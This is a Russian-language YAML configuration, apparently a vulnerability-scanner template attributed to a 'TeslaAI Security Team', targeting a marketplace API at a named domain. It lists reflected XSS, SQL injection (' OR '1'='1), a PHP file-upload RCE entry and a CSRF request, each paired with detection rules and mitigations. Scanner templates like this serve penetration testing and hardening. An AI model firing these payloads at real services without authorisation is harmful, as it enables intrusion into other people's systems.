# Эксплойт-пак для автоматизированного сканирования и эксплуатации известных уязвимостей маркетплейса TeslaAI
# Версия 1.2.0
# Обновлен 2025-07-08
# Автор: TeslaAI Security Team

name: TeslaAI Marketplace Exploit Pack
description: >
  Набор эксплойтов для обнаружения и эксплуатации критических уязвимостей
  в веб-сервисах маркетплейса TeslaAI. Включает скрипты для XSS, SQLi, RCE,
  а также обходы аутентификации и CSRF.

targets:
  - name: TeslaAI Marketplace API
    base_url: https://api.tesla-marketplace.com/v1
    methods:
      - GET
      - POST
    headers:
      Content-Type: application/json
      Authorization: "Bearer <TOKEN_PLACEHOLDER>"

exploits:
  - id: XSS-001
    title: Reflected XSS в параметре search
    description: >
      Уязвимость позволяет внедрить произвольный JavaScript код
      через параметр search GET-запроса.
    request:
      method: GET
      endpoint: "/products?search=<PAYLOAD>"
      payloads:
        - "<script>alert('XSS')</script>"
    detection:
      type: reflected
      match: "<script>alert('XSS')</script>"
    mitigation: >
      Использовать экранирование и валидацию входных данных.

  - id: SQLi-002
    title: SQL-инъекция в endpoint /orders
    description: >
      Уязвимость позволяет выполнить произвольный SQL запрос через параметр user_id.
    request:
      method: POST
      endpoint: "/orders"
      data:
        user_id: "' OR '1'='1"
        product_id: "1"
        quantity: 1
    detection:
      type: error-based
      match: "SQL syntax error"
    mitigation: >
      Использовать подготовленные выражения и ORM.

  - id: RCE-003
    title: Удалённое выполнение кода через параметр upload
    description: >
      Возможность загрузки и выполнения вредоносного скрипта через форму upload.
    request:
      method: POST
      endpoint: "/upload"
      files:
        file: "exploit_payload.php"
    detection:
      type: response-check
      match: "Payload executed"
    mitigation: >
      Ограничить типы файлов и проводить глубокую проверку содержимого.

  - id: CSRF-004
    title: Обход защиты CSRF на endpoint /orders/cancel
    description: >
      Отсутствие проверки CSRF токена позволяет отменить заказы посторонним.
    request:
      method: POST
      endpoint: "/orders/12345/cancel"
      headers:
        Referer: "http://malicious-site.com"
    detection:
      type: status-code
      match: 200
    mitigation: >
      Внедрить CSRF токены и проверять Origin заголовки.

recommendations:
  - Обновить серверное ПО до последних версий.
  - Внедрить WAF для блокировки подозрительных запросов.
  - Проводить регулярный аудит кода и тестирование на проникновение.
